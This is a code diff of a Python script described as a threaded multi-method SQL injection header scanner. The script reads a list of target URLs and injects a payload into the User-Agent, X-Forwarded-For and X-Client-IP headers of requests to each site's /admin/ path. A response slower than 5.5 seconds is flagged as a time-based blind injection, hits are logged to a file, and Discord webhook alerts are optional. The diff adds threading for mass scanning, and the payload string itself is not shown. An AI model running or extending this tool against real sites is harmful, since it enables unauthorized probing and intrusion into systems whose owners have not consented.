@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 import requests
 import argparse
 import time
@@ -6,11 +8,13 @@ import urllib3
 import os
 from datetime import datetime
 from colorama import Fore, Style, init
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
 
 init(autoreset=True)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-DISCORD_WEBHOOK = ""  # <-- Put your Discord webhook here if you want
+DISCORD_WEBHOOK = ""  # <-- Add Your Discord Webhook Here if Needed
 
 PROXIES = {
     # "http": "http://127.0.0.1:8080",
@@ -28,11 +32,12 @@ base_headers = {
 }
 
 headers_to_test = ["User-Agent", "X-Forwarded-For", "X-Client-IP"]
-
 methods_to_test = ["GET", "POST", "PUT", "OPTIONS", "HEAD", "PATCH"]
-
 timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
-output_file = "vulnerable_endpoints_%s.txt" % timestamp
+output_file = f"vulnerable_endpoints_{timestamp}.txt"
+
+lock = threading.Lock()
+
 
 def send_discord_alert(url, method, header, attack_headers):
     if DISCORD_WEBHOOK:
@@ -44,33 +49,71 @@ def send_discord_alert(url, method, header, attack_headers):
             }
             requests.post(DISCORD_WEBHOOK, json=data, proxies=PROXIES, verify=False)
         except Exception as e:
-            print(Fore.YELLOW + "[!!] Discord alert failed: %s" % str(e) + Style.RESET_ALL)
+            with lock:
+                print(Fore.YELLOW + "[!!] Discord alert failed: %s" % str(e) + Style.RESET_ALL)
+
 
 def is_vulnerable(url, method, injected_header):
     try:
         headers = base_headers.copy()
         headers[injected_header] = payload
+
         start = time.time()
-        if method == "GET":
-            response = requests.get(url + "/admin/", headers=headers, timeout=10, verify=False, proxies=PROXIES)
-        elif method == "POST":
-            response = requests.post(url + "/admin/", headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=PROXIES)
-        elif method == "PUT":
-            response = requests.put(url + "/admin/", headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=PROXIES)
-        elif method == "OPTIONS":
-            response = requests.options(url + "/admin/", headers=headers, timeout=10, verify=False, proxies=PROXIES)
-        elif method == "HEAD":
-            response = requests.head(url + "/admin/", headers=headers, timeout=10, verify=False, proxies=PROXIES)
-        elif method == "PATCH":
-            response = requests.patch(url + "/admin/", headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=PROXIES)
-        else:
-            return False, None, None
-        duration = time.time() - start
-        return duration > 5.5, response.status_code, method
+
+        request_func = {
+            "GET": requests.get,
+            "POST": requests.post,
+            "PUT": requests.put,
+            "OPTIONS": requests.options,
+            "HEAD": requests.head,
+            "PATCH": requests.patch
+        }.get(method)
+
+        if request_func:
+            kwargs = {
+                "headers": headers,
+                "timeout": 10,
+                "verify": False,
+                "proxies": PROXIES
+            }
+
+            if method in ["POST", "PUT", "PATCH"]:
+                kwargs["data"] = {"test": "test"}
+
+            response = request_func(url + "/admin/", **kwargs)
+            duration = time.time() - start
+            return duration > 5.5, response.status_code, method
     except Exception:
         return False, None, method
 
-def main(file_path):
+    return False, None, method
+
+
+def test_url(url, total, idx):
+    random.shuffle(methods_to_test)
+    for method in methods_to_test:
+        random.shuffle(headers_to_test)
+        for header in headers_to_test:
+            with lock:
+                print(f"\n[{idx}/{total}] {url} | Trying {method} with header {header}...")
+
+            vulnerable, status, used_method = is_vulnerable(url, method, header)
+            with lock:
+                if vulnerable:
+                    print(Fore.GREEN + f"  [!!] Vulnerable! {url} | Status: {status} | Method: {used_method} | Header: {header}" + Style.RESET_ALL)
+                    with open(output_file, "a") as out:
+                        out.write(f"{url} | {used_method} | {header}\n")
+                        out.flush()
+                        os.fsync(out.fileno())
+                    send_discord_alert(url, used_method, header, base_headers)
+                    return  # Stop further testing this URL after first vuln
+                else:
+                    color = Fore.RED if status else Fore.YELLOW
+                    print(color + f"  [--] Not vulnerable | Status: {status if status else 'Error/Timeout'}" + Style.RESET_ALL)
+            time.sleep(1)
+
+
+def main(file_path, threads):
     with open(file_path, 'r') as f:
         raw_urls = [line.strip() for line in f if line.strip()]
 
@@ -82,36 +125,19 @@ def main(file_path):
 
     random.shuffle(urls)
 
-    print("\n[+] Loaded %d targets. Starting scan...\n" % len(urls))
+    print(f"\n[+] Loaded {len(urls)} targets. Scanning with {threads} threads...\n")
 
-    for idx, url in enumerate(urls):
-        print("\n[%d/%d] Testing: %s" % (idx + 1, len(urls), url))
-        random.shuffle(methods_to_test)
-        for method in methods_to_test:
-            random.shuffle(headers_to_test)
-            for header in headers_to_test:
-                print("  [*] Trying %s with header %s..." % (method, header))
-                vulnerable, status, used_method = is_vulnerable(url, method, header)
-                if vulnerable:
-                    print(Fore.GREEN + "  [!!] Vulnerable! %s | Status: %s | Method: %s | Header: %s" % (url, status, used_method, header) + Style.RESET_ALL)
-                    with open(output_file, "a") as out:
-                        out.write("%s | %s | %s\n" % (url, used_method, header))
-                        out.flush()
-                        os.fsync(out.fileno())
-                    send_discord_alert(url, used_method, header, base_headers)
-                    break
-                else:
-                    color = Fore.RED if status else Fore.YELLOW
-                    print(color + "  [--] Not vulnerable | Status: %s" % (status if status else "Error/Timeout") + Style.RESET_ALL)
-                time.sleep(3)
-            else:
-                continue
-            break
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = [executor.submit(test_url, url, len(urls), idx + 1) for idx, url in enumerate(urls)]
+        for _ in as_completed(futures):
+            pass  # Wait for all to finish
 
-    print("\n[+] Scan finished. Vulnerable results saved in: %s\n" % output_file)
+    print(f"\n[+] Scan finished. Vulnerable results saved in: {output_file}\n")
+
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Multi-Method SQLi Scanner + Single File Export")
+    parser = argparse.ArgumentParser(description="Threaded Multi-Method SQLi Header Scanner")
     parser.add_argument("-f", "--file", required=True, help="Path to file with target URLs")
+    parser.add_argument("-t", "--threads", type=int, default=20, help="Number of threads (Default: 20)")
     args = parser.parse_args()
-    main(args.file)
+    main(args.file, args.threads)
